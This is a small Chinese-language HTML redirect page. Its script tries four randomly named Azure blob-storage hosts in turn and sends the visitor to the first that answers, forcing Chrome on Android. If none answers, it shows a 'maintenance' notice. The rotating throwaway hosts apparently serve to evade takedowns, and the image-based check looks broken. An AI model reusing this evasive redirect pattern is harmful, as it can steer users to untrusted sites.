<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>跳转中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      background: #f9f9f9;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #555;
    }
    .message {
      text-align: center;
      display: none;
    }
    .loading {
      font-size: 18px;
    }
    .fail {
      color: #d00;
    }
  </style>
</head>
<body>
  <div class="message" id="loadingMsg">
    <div class="loading">正在跳转，请稍候...</div>
  </div>

  <div class="message fail" id="failMsg">
    <div>项目维护中，请稍后再试。</div>
  </div>

  <script>
    const urls = [
      "https://iwtq25dhr.blob.core.windows.net/home/index.html",
      "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
      "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
      "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
    ];

    const isAndroid = /android/i.test(navigator.userAgent);
    const loadingMsg = document.getElementById("loadingMsg");
    const failMsg = document.getElementById("failMsg");

    loadingMsg.style.display = "block";

    let loaded = false;

    function testUrl(urlIndex) {
      if (urlIndex >= urls.length) {
        loadingMsg.style.display = "none";
        failMsg.style.display = "block";
        return;
      }

      const img = new Image();
      const url = urls[urlIndex];
      img.onload = () => {
        if (loaded) return;
        loaded = true;

        // ✅ Android 强制使用 Chrome 打开外部链接
        if (isAndroid) {
          window.location.href =
            `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
        } else {
          window.location.href = url;
        }
      };
      img.onerror = () => testUrl(urlIndex + 1);

      // 触发加载
      img.src = url + "?t=" + Date.now();
    }

    // 延迟一点点再开始测试，以防白屏
    setTimeout(() => testUrl(0), 300);
  </script>
</body>
</html>
